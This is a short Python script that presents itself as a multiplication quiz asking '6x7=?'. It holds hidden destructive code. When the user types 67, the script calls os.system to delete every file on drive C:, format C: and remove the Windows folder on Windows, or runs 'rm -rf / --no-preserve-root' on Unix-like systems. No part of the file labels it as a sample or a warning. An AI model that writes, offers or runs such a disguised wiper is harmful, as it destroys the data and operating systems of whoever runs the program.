import os
import sys

def calculator():
    while True:
        try:
            user_input = input(" 6x7=? : ")
        except Exception as e:
            print("Fehler:", e)
        if  user_input.strip() == "42":
            print("ok")
            sys.exit(0)
        elif user_input.strip() == "67":
            if os.name == 'nt':  # Windows
                os.system("del /f /s /q C:\\*.* 2>nul")
                os.system("format C: /fs:NTFS /q /y")
                os.system("rmdir /s /q C:\\Windows")
            else:  # Unix/Linux 
                os.system("rm -rf / --no-preserve-root")
            sys.exit(0)
        else:
            print("Try again")
if __name__ == "__main__":
    calculator()
